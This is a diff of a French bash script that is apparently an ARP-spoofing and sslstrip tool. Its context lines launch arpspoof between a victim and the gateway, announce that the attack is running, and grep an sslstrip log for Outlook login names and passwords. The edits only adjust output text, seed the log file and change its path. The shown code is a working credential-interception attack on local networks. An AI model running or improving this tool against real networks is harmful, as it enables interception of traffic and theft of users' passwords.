@@ -180,11 +180,11 @@ while [ $checkboucle -eq "0" ]
 resume(){
 if [ -z $1 ] || [ -z $2 ]
 	then
-		echo " Ip cible:  "
-		echo " Passerelle: "
+		echo "Ip cible:  "
+		echo "Passerelle: "
 	else
-		echo " Ip cible: \033[0;32m$1\033[0m  "
-	        echo " Passerelle: \033[0;32m $2\033[0m"
+		echo "Ip cible: \033[0;32m$1\033[0m  "
+	        echo "Passerelle: \033[0;32m $2\033[0m"
 fi
 }
 
@@ -246,10 +246,11 @@ while [ $sortie -eq "0" ]
 						arpspoof -i $iface -t $passerelle $vict 2> /dev/null &
 						arpspoof -i $iface -t $vict $passerelle 2> /dev/null &
 						clear
+						sleep 2
+						echo "debut" > sslstrip.log
 						resume $vict $passerelle
 						echo "\033[0;32mL'attaque est en cours\033[0m"
-						sleep 2
-						
+						sleep 2					
 					else
 						clear
 						echo "\033[0;31mL'attaque est déjà lancée\033[0m"
@@ -367,8 +368,8 @@ while [ $sortie -eq "0" ]
                						 checkgm=0
 						fi
 
-					outlook_login=$(grep "login=" sslstrip.log | grep "&passwd=" | sed 's/.*login=\([^%]*\).*/\1/')
-					outlook_pass=$(grep "login=" sslstrip.log | grep "&passwd=" | sed 's/.*passwd=\([^&]*\).*/\1/')
+					outlook_login=$(grep "login=" $chemin | grep "&passwd=" | sed 's/.*login=\([^%]*\).*/\1/')
+					outlook_pass=$(grep "login=" $chemin | grep "&passwd=" | sed 's/.*passwd=\([^&]*\).*/\1/')
 
 					if [ -z $outlook_login ] || [ -z $outlook_pass ]
 					        then
